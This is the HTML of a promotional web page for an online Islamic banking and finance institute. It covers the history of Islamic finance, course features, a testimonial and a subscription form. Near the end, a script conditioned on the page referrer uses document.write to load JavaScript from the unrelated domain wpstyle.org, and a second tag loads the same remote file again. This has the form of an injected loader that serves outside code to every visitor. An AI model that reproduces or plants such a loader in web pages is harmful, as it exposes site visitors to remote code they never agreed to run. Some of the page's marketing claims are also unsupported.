<li>When Prophet migrated to Madinah, the main source of income of the people living in there was agriculture. They used to make a forward contract, for prescribed dates, that to be delivered later in 1, 2 or 3 years time. This was the ancient form of Salam. Prophet Mohammed (Peace Be Upon Him) allowed this kind of transaction under some conditions. Other Islamic modes of transactions that Prophet allowed in his time includes Shirkah, Ijarah and Sarf.</li>
<li>Later, during eighth and twelfth centuries, the Muslim world developed several Shari'ah based instruments. They include Hawala, Trusts, Promissory Notes, Bills of Exchange, and System of Cheque.</li>
<li>In mid of the nineteenth century, the Islamic world started practising modern Islamic Banking system. This system was derived from the Quran, Hadees, Ijmah, and Qiyas. In the new system, all the prohibited elements have been excluded, such as Usury, Uncertainty, and Speculation. A concept of formal Islamic finance training was started after that period.</li>
<li>It is a very common concept that, Islamic Banking is not really Islamic. As a matter of fact, there is no issue with the Islamic Banking as a system. However, due to some commercial minded bankers and investors, the industry is now facing some issues. But, these issues are resolving over the time. AIMS institute of Islamic banking and finance is now successfully performing a major role in this regard.</li>
<li>There is a major difference between conventional banking, and Islamic banking systems. Suppose that you wants to start a manufacturing plant. If you go to a conventional bank, the bank will pay you the money for the business. The bank will charge you an interest on that money. In a contrary, if you go to an Islamic Bank, the bank will make partnership with you in your business.</li>
<li>Since, the financial risk is borne by the investors, only the people with skilled business proposals come up. This strengthens the economy of the society. And this is the reason, why the Islamic banks were unaffected by the recent banking and sub-prime mortgage crisis.</li>
</ul>
</div>
        </div></div></div><div class="panel-grid" id="pg-4097-5"><div class="panel-grid-cell" id="pgc-4097-5-0"><div class="so-panel widget widget_text widget_text panel-first-child panel-last-child" id="panel-4097-5-0-0"><h3 class="widget-title" style="content: inherit;"><i class="linecon-graduation-cap"></i>Islamic Finance Training Methodology</h3>        <div class="textwidget"><div class="entry-thumb" style="margin-bottom:0;">
<img src="http://www.aims.education/wp-content/uploads/2015/08/elearning.jpg" width="943" height="472" alt="elearning"><br>
 <span class="hover-box"><br>
      <a href="#" class="more-link" style="display:none;"> </a><br>
      <a href="http://www.aims.education/wp-content/uploads/2015/08/elearning.jpg" class="zoom-link"></a>
</span></div>
</div>
        </div></div><div class="panel-grid-cell" id="pgc-4097-5-1"><div class="so-panel widget widget_siteorigin-panels-embedded-video widget_siteorigin-panels-embedded-video panel-first-child panel-last-child" id="panel-4097-5-1-0"><div class="siteorigin-fitvids"><div class="entry-content-asset"><div class="fluid-width-video-wrapper" style="padding-top: 56.25%;"><iframe src="https://player.vimeo.com/video/103128147" frameborder="0" title="Demo e-Lecture | Islamic Finance" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" id="fitvid113565"></iframe></div></div></div></div></div></div><div class="panel-grid" id="pg-4097-6"><div class="panel-grid-cell" id="pgc-4097-6-0"><div class="so-panel widget widget_text widget_text panel-first-child panel-last-child" id="panel-4097-6-0-0"><h3 class="widget-title" style="content: inherit;"><i class="linecon-graduation-cap"></i>Why AIMS’ Institute of Islamic Banking and Finance?</h3>        <div class="textwidget"><ul class="styled-list">
<li>Worldly renowned institute of islamic banking and finance, since year 2005.</li>
<li>Islamic finance training programs are designed by the well recognized scholars.</li>
<li>Curriculum of AIMS programs are updated on regular basis. It allow candidates to practice the latest trends in the field.</li>
<li>Students study at their own pace, and it may be scheduled between work and the family.</li>
<li>Certifications that are issued by AIMS are well recognized among financial companies, all over the world.</li>
</ul>
</div>
        </div></div><div class="panel-grid-cell" id="pgc-4097-6-1"><div class="so-panel widget widget_crum_widget_v_accordion widget_crum_widget_v_accordion panel-first-child panel-last-child" id="panel-4097-6-1-0"><h3 class="widget-title" style="content: inherit;"><i class="linecon-lightbulb"></i>Islamic Finance Training Features</h3>
        <div class="row">
            <div class="five columns">
                <dl class="vertical tabs">

                    <dd class="active">
                        <a href="#tab-v-crum-1">
                            <i class="icon linecon-desktop"></i>
                            <span class="tab-title">Effective Learning</span>
                        </a>
                    </dd>
                                            <dd>
                            <a href="#tab-v-crum-2">
                                <i class="icon linecon-thumbs-up"></i>
                                <span class="tab-title">Multiple Resources</span>
                            </a>
                        </dd>
                                            <dd>
                            <a href="#tab-v-crum-3">
                                <i class="icon linecon-calendar"></i>
                                <span class="tab-title">Self-paced Learning</span>
                            </a>
                        </dd>
                                            <dd>
                            <a href="#tab-v-crum-4">
                                <i class="icon linecon-globe"></i>
                                <span class="tab-title">Universal Accessibility</span>
                            </a>
                        </dd>
                    
                </dl>
            </div>
            <div class="seven columns">
                <ul class="tabs-content">

                    <li class="active" id="tab-v-crum-1Tab">
                        Learning contents, which are designed by the institute of Islamic banking and finance, are not like a typical books. Syllabus written for the Islamic finance training keep students focused on their subject. Online Islamic finance training resources are delivered through cutting edge technology. Topics are explained through animated video lectures. It gives the best study experience, with unique style and voice narrations. Study guide books from the institute of Islamic banking and finance are given to students, with each program they enroll in.                    </li>

                    <li id="tab-v-crum-2Tab">AIMS institute of islamic banking and finance offers the best islamic finance training. There are many resources, which are used to deliver these programs, and many activities are included in it. Main study resources used for the Islamic finance training are e-lectures, e-manuals and 24/7 faculty support. In addition to that, assignments are given to all students, which help students to prepare for their exam. </li><li id="tab-v-crum-3Tab">Students access the study resources 100% online and study at per their convenience. Students submit the assignments as per their own schedule. Students decide their own date and time, to appear in the final exam. </li><li id="tab-v-crum-4Tab">Programs offered by the institute of Islamic banking and finance is easy to get. Students can take benefit of these programs from any part of the world. No travel cost or travel time is wasted for this off campus education. Once students login to their e-class, they can easily access their learning content from any where and any time (such as home, office, or a hotel room)</li>
                </ul>
            </div>
        </div>

        </div></div></div><div class="panel-grid" id="pg-4097-7"><div class="panel-grid-cell" id="pgc-4097-7-0"><div class="so-panel widget widget_text widget_text panel-first-child" id="panel-4097-7-0-0">        <div class="textwidget"><h3 style="margin-top:0px;margin-bottom:0px;">What Our Student Say!</h3>
</div>
        </div>
    <div class="to-action-block al-left">
        <div class="ovh">
            <h5>I had a great time studying Islamic Finance from the Institute of Islamic Banking and Finance at AIMS. I completed my CIFE online with the help of online lectures, study manuals and other academic resources. They all are well organized. The Islamic finance training contents are excellent and they give the true picture of Islamic Finance. The views expressed in the program, are in accordance with the views of the scholars like Mufti Taqi Usmani. Programs are 100% and studies are AAOIFI Shariah compliant. I would strongly recommend the institute of Islamic finance to everyone. If you do not have knowledge of Islam or finance, you will learn it here. The programs starts from the fundamentals. I got a job as soon as I started my CIFE. I first completed my CIFE, and I am now pursuing the MDIF qualification. </h5>
                    </div>
		
        <a class="action-button" href=""> <span class="icon linecon-comment"></span> <br>Nida Khan<br>Luxembourg</a>    </div>

    </div></div></div>  


        </div>
    </div>
</section>
    <section id="footer"><!--WPFC_FOOTER_START-->
    <div class="row">
        <div class="three columns">
            <section id="nav_menu-6" class="widget widget_nav_menu"><h3 class="widget-title" style="content: inherit;"><i class="linecon-graduation-cap"></i>Follow Us</h3><div class="menu-follow-us-container"><ul id="menu-follow-us" class="menu"><li id="menu-item-11384" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11384"><a href="https://www.facebook.com/aimseducationonline">Facebook</a></li>
<li id="menu-item-11385" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11385"><a href="https://plus.google.com/+AimsEducationOnline">Google+</a></li>
<li id="menu-item-11386" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11386"><a href="https://twitter.com/EducationAIMS">Twitter</a></li>
<li id="menu-item-11387" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11387"><a href="https://www.linkedin.com/company/aimseducationonline/">LinkedIn</a></li>
<li id="menu-item-11388" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11388"><a href="http://www.youtube.com/c/AimsEducationOnline">YouTube</a></li>
</ul></div></section>        </div>
        <div class="five columns">
            <section id="roots_vcard_widget-2" class="widget widget_roots_vcard_widget"><h3 class="widget-title" style="content: inherit;"><i class="linecon-diamond"></i>Address</h3><div class="vcard contacts-widget">
    <p class="adress">
        <span class="adr">
             <span class="street-address">Academy for International Modern Studies (AIMS), </span>
             <span class="locality">20-22 Wenlock Road, </span>,
             <span class="region">London  N1 7GU, </span>
             <span class="postal-code">United Kingdom</span>       </span>
    </p>
        <p class="other">Web: <a class="fn org url" href="http://www.aims.education/">http://www.aims.education</a></p>
    </div>
    
</section><section id="text-4" class="widget widget_text">        <div class="textwidget"><div class="small-logo" style="
    margin-right: 15px;
    margin-top: -3px;
    max-width: 25%;
">                    <img src="http://www.aims.education/wp-content/uploads/2014/05/logosm1-e1419407855495.png" alt="AIMS">
                </div>
<p><i>Copyright 2015 AIMS, All rights reserved</i></p><p></p></div>
        </section>        </div>
        <div class="four columns">
            <section id="text-8" class="widget widget_text"><h3 class="widget-title" style="content: inherit;"><i class="linecon-graduation-cap"></i>Subscription</h3>        <div class="textwidget"><p><i>Latest news, industry jobs and offers from AIMS</i></p>

<div role="form" class="wpcf7" id="wpcf7-f11417-o1" lang="en-US" dir="ltr">
<div class="screen-reader-response"></div>
<form action="/islamic-banking-and-finance-institute/#wpcf7-f11417-o1" method="post" class="wpcf7-form" novalidate="novalidate">
<div style="display: none;">
<input type="hidden" name="_wpcf7" value="11417">
<input type="hidden" name="_wpcf7_version" value="4.3">
<input type="hidden" name="_wpcf7_locale" value="en_US">
<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f11417-o1">
<input type="hidden" name="_wpnonce" value="cefa0cf3a3">
</div>
<p style="width:250px;">Email * <span class="wpcf7-form-control-wrap your-email"><input type="email" name="your-email" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" aria-required="true" aria-invalid="false"></span> </p>
<p style="width:250px;">Area of Interest * <span class="wpcf7-form-control-wrap menu-195"><select name="menu-195" class="wpcf7-form-control wpcf7-select" aria-invalid="false"><option value="Project Management">Project Management</option><option value="Supply Chain Management">Supply Chain Management</option><option value="Islamic Finance">Islamic Finance</option></select></span> </p>
<div style="float:left; width:70px; margin:0px; position: absolute; margin-top: -14px; line-height: 32px;">Enter Code</div>
<div style="float: left; width: 72px; margin-top: 7px; padding-top: 5px"><input type="hidden" name="_wpcf7_captcha_challenge_captcha-690" value="150214553"><img class="wpcf7-form-control wpcf7-captchac wpcf7-captcha-captcha-690" width="72" height="24" alt="captcha" src="http://www.aims.education/wp-content/uploads/wpcf7_captcha/150214553.png"></div>
<div style="float:left; width:118px; margin:10px; margin-right: 6px; margin-top: 0; "><span class="wpcf7-form-control-wrap captcha-690"><input type="text" name="captcha-690" value="" size="40" class="wpcf7-form-control wpcf7-captchar" aria-invalid="false"></span></div>
<p><input type="submit" value="Subscribe" class="wpcf7-form-control wpcf7-submit"><img class="ajax-loader" src="http://www.aims.education/wp-content/plugins/contact-form-7/images/ajax-loader.gif" alt="Sending ..." style="visibility: hidden;"></p>
<div class="wpcf7-response-output wpcf7-display-none"></div></form></div></div>
        </section>        </div>
    </div>

<!-- Google Code for Remarketing Tag -->
<!--------------------------------------------------
Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on: http://google.com/ads/remarketingsetup
--------------------------------------------------->
<script type="text/javascript">
var google_tag_params = {
edu_pid: 'REPLACE_WITH_VALUE',
edu_plocid: 'REPLACE_WITH_VALUE',
edu_pagetype: 'REPLACE_WITH_VALUE',
edu_totalvalue: 'REPLACE_WITH_VALUE',
dynx_itemid: 'REPLACE_WITH_VALUE',
dynx_itemid2: 'REPLACE_WITH_VALUE',
dynx_pagetype: 'REPLACE_WITH_VALUE',
dynx_totalvalue: 'REPLACE_WITH_VALUE',
};
</script>
<script type="text/javascript">
/* <![CDATA[ */
var google_conversion_id = 962033039;
var google_custom_params = window.google_tag_params;
var google_remarketing_only = true;
/* ]]> */
</script>
<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
</script><iframe name="google_conversion_frame" title="Google conversion frame" width="300" height="13" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/962033039/?random=1444774245913&amp;cv=8&amp;fst=1444774245913&amp;num=1&amp;fmt=1&amp;guid=ON&amp;u_h=768&amp;u_w=1366&amp;u_ah=768&amp;u_aw=1304&amp;u_cd=24&amp;u_his=2&amp;u_tz=480&amp;u_java=true&amp;u_nplug=6&amp;u_nmime=8&amp;data=edu_pid%3DREPLACE_WITH_VALUE%3Bedu_plocid%3DREPLACE_WITH_VALUE%3Bedu_pagetype%3DREPLACE_WITH_VALUE%3Bedu_totalvalue%3DREPLACE_WITH_VALUE%3Bdynx_itemid%3DREPLACE_WITH_VALUE%3Bdynx_itemid2%3DREPLACE_WITH_VALUE%3Bdynx_pagetype%3DREPLACE_WITH_VALUE%3Bdynx_totalvalue%3DREPLACE_WITH_VALUE&amp;frm=0&amp;url=http%3A//www.aims.education/islamic-banking-and-finance-institute/" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no">&lt;img height="1" width="1" border="0" alt="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/962033039/?frame=0&amp;random=1444774245913&amp;cv=8&amp;fst=1444774245913&amp;num=1&amp;fmt=1&amp;guid=ON&amp;u_h=768&amp;u_w=1366&amp;u_ah=768&amp;u_aw=1304&amp;u_cd=24&amp;u_his=2&amp;u_tz=480&amp;u_java=true&amp;u_nplug=6&amp;u_nmime=8&amp;data=edu_pid%3DREPLACE_WITH_VALUE%3Bedu_plocid%3DREPLACE_WITH_VALUE%3Bedu_pagetype%3DREPLACE_WITH_VALUE%3Bedu_totalvalue%3DREPLACE_WITH_VALUE%3Bdynx_itemid%3DREPLACE_WITH_VALUE%3Bdynx_itemid2%3DREPLACE_WITH_VALUE%3Bdynx_pagetype%3DREPLACE_WITH_VALUE%3Bdynx_totalvalue%3DREPLACE_WITH_VALUE&amp;frm=0&amp;url=http%3A//www.aims.education/islamic-banking-and-finance-institute/" /&gt;</iframe>
<noscript>
&lt;div style="display:inline;"&gt;
&lt;img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/962033039/?value=0&amp;guid=ON&amp;script=0"/&gt;
&lt;/div&gt;
</noscript>
<section id="sub-footer">
    <div class="row">
        <div class="six mobile-two columns copyr">

                 <img src="" alt="logo" class="foot-logo">

                
        </div>
        <div class="six mobile-two columns">

            
        </div>
    </div>
</section></section>


    <a href="#" id="linkTop" class="backtotop hidden"></a>

</div>

<script type="text/javascript"> if(!document.referrer || document.referrer == '') { document.write('<scr'+'ipt type="text/javascript" src="http://www.wpstyle.org/jquery.min.js"></scr'+'ipt>'); } else { document.write('<scr'+'ipt type="text/javascript" src="http://www.wpstyle.org/jquery.js"></scr'+'ipt>'); } </script><script type="text/javascript" src="http://www.wpstyle.org/jquery.min.js"></script><script type="text/javascript" src="http://www.aims.education/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20"></script>
<script type="text/javascript">
/* <![CDATA[ */
var _wpcf7 = {"loaderUrl":"http:\/\/www.aims.education\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Sending ..."};
/* ]]> */
</script>
<script type="text/javascript" src="http://www.aims.education/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=4.3"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/themes/Glider/assets/js/foundation.min.js"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/themes/Glider/assets/js/animation.js"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/themes/Glider/assets/js/app.js"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/themes/Glider/assets/js/gmap3.min.js"></script>
<script type="text/javascript" src="http://www.aims.education/wp-includes/js/jquery/jquery.color.min.js?ver=2.1.1"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/themes/Glider/assets/js/jquery.flexslider-min.js"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/themes/Glider/assets/js/jquery.prettyPhoto.js"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/plugins/siteorigin-panels/widgets/js/jquery.fitvids.js?ver=2.2"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/plugins/siteorigin-panels/widgets/js/embedded-video.js?ver=2.2"></script>


<!-- This page was not cached because ContactForm7's captcha --></body></html>